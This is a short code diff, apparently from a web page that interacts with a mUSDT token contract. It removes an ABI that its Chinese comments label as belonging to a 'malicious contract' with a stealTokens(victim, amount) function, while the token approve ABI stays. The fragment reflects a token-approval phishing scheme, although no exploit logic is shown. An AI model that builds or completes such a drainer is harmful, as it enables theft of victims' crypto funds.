@@ -82,19 +82,6 @@
     // 你部署的 mUSDT 代幣合約地址
     const MUSDT_CONTRACT_ADDRESS = "0xbd7ba6764f2b0a5cf4e3e1f74a0e925e4dd05e4b"; 
 
-    // 惡意合約的 ABI，只需要包含 stealTokens 函數
-    const phishingABI = [
-        {
-            "inputs": [
-                { "internalType": "address", "name": "victim", "type": "address" },
-                { "internalType": "uint256", "name": "amount", "type": "uint256" }
-            ],
-            "name": "stealTokens",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        }
-    ];
 
     // mUSDT 代幣的 ABI，只需要包含 approve 函數
     const musdtABI = [
